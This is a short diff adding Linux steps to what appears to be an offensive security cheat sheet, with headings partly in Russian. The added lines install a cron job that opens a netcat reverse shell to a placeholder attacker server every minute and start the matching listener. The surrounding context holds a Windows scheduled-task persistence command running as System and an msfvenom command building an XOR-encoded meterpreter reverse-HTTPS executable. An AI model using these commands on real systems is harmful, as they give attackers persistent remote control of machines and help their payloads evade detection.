@@ -253,6 +253,14 @@ Windows
 schtasks /create /tn Update /tr "file" /sc onlogon /ru System #minite
 ```
 
+linux
+
+```
+(crontab -l;printf "*/1 * * * * nc ip_server_to_connect 3000 -e /bin/bash\n")|crontab -
+
+nc -vlkp 3000 2>/dev/null
+```
+
 ## Генерация нагрузки
 ```
 msfvenom -p windows/meterpreter/reverse_winhttps lhost=172.16.7.2 lport=443 -e x86/xor_dynamic -f exe > idm4.exe
